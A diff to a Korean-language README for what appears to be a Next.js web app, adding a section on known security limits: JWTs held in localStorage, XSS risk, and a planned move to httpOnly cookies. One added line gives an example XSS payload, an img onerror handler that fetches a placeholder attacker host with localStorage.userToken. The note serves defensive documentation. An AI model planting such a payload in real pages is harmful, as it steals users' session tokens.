@@ -85,4 +85,17 @@ npm run dev            # http://localhost:3000
 - [디자인 기준](./docs/DESIGN.md)
 - [리팩터링 체크리스트](./docs/REFACTOR.md)
 
-MIT
+## 알려진 보안 한계
+
+- **JWT를 `localStorage`에 둔다** (`src/app/admin/page.js`의 `adminToken`,
+  `src/app/customer/page.js`의 `userToken`). 페이지에 XSS가 하나라도 생기면 스크립트가 토큰을
+  그대로 읽어 간다 — 관리자 토큰이면 전체 고객 정보가 노출된다. 외부 스크립트를 넣거나
+  `dangerouslySetInnerHTML`을 쓸 때는 이 전제를 떠올릴 것.
+- 장기 해결: Next.js rewrites로 API를 같은 origin에 두고 `httpOnly` 쿠키로 옮긴다 (별도 이슈).
+- 'XSS': 후기나 어떤 문자 형태를 html형태로 한 다음에, 정보 가져가는 방식.
+-  <img src=x onerror="fetch('https://악의적 주소.com?t='+localStorage.userToken)">
+- 문자열에 html이 js 실행하게 하는 보안 문제
+
+## 라이선스
+
+MIT — [`LICENSE`](LICENSE) 참고.
